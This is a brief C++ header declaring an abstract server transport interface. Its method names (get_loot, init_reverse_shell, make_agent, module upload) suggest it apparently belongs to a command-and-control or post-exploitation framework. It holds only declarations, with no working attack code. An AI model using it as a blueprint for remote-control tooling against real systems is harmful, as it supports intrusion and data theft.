#pragma once

#include "common.h"
#include "typedefs.h"

class ServerTransport
{
private:
    pClientNode node;
public:
    virtual int download_file(char *ptr, int is_manager, char *extra) = 0;
    virtual int get_loot(char *loot) = 0;
    virtual int upload_file(char *ptr, int is_module) = 0;
    virtual int get_info(char *ptr) = 0;
    virtual int init_reverse_shell() = 0;
    virtual int determine_handler() = 0;
    //virtual int handle_auth() = 0;
    virtual int handle(void *sess) = 0;

    pClientNode get_node(){return this->node;};
    virtual void make_agent(char *dat_ptr, char *d_ptr) = 0;
};

